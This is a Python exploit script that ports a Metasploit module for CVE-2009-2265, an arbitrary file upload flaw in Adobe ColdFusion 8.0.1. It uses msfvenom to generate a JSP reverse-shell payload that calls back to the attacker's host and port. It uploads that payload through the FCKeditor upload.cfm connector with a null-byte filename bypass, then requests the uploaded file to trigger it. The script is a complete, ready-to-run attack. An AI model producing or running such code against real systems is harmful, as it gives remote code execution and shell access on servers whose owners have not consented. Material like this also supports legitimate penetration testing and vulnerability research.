#!/usr/bin/python3
#
# This exploit is an attempt to port the Metasploit Module 16788.rb, which exploits the
# Adobe ColdFusion 8.0.1 Arbitrary File Upload Vulnerability
# CVE : 2009-2265
# I use the python Requests package to simply the processing of multi part form data, so you will
# need to install this module if you dont have it already installed.
# You can install  it by running  ' pip install requests ' or 'pipenv install requests'. You cam find more detailed info at https://requests.readthedocs.io/en/master/user/install/#install
# The code uses msfvenom to generate a jsp payload called rshell.jsp, and uploads it. You will need to provide
# the LPORT amd LHOST values to be used for the generation of the shellcode, and start your listner before executing
# the exploit.
# Revision 20041201
# @Author : Herbert Maosa splicer01, maosaherbert@gmail.com
import socket
import sys
import requests
import string
import random
import os
import argparse
#
def exploit(RHOST,RPORT,LHOST,LPORT):
    ''' In the line below I am generating the shellcode first, using msfvenom '''
    os.system('msfvenom -p java/jsp_shell_reverse_tcp LHOST='+ LHOST +' LPORT='+LPORT+' -o rshell.jsp')
    ''' Below we generate a random filename for the jsp file that will be uploaded. It can be anything really '''
    strShellFileName =  ''.join(random.sample(string.ascii_uppercase,5))
    ''' and below is the file name that will be encoded as the value for the multi-part form variable filename '''
    strFileName =  ''.join(random.sample(string.ascii_uppercase,8))+'.txt'
    multi_part_form_data = {'newfile':(strFileName,open('rshell.jsp'),'application/x-java-archive')}
    ''' Below is the default URL to upload.cfm. Change it if necesssary. the nullbyte%00 is appended to the file name together with the jsp extension. '''
    upload_url = 'http://'+RHOST+':'+RPORT+'/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/' +strShellFileName +'.jsp%00'
    execute_url = 'http://'+RHOST+':'+RPORT+'/userfiles/file/'+strShellFileName+'.jsp'
    print("... Sending our POST request ...")
    r=requests.post(upload_url,files=multi_part_form_data)
    if (r.status_code==200):
        print("...Upload successful ...\n... Executing our uploaded shell, check in Listener ... ")
        requests.get(execute_url)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('RHOST', help="The IP Address of the remote host running Coldfusion 8")
    parser.add_argument('RPORT', help="The remote port number running running Coldfusion 8")
    parser.add_argument('LHOST', help="Your local IP Address for receiving the shell")
    parser.add_argument('LPORT', help="Your local port for catching the shell")
    args = parser.parse_args()
    exploit(args.RHOST,args.RPORT,args.LHOST,args.LPORT)



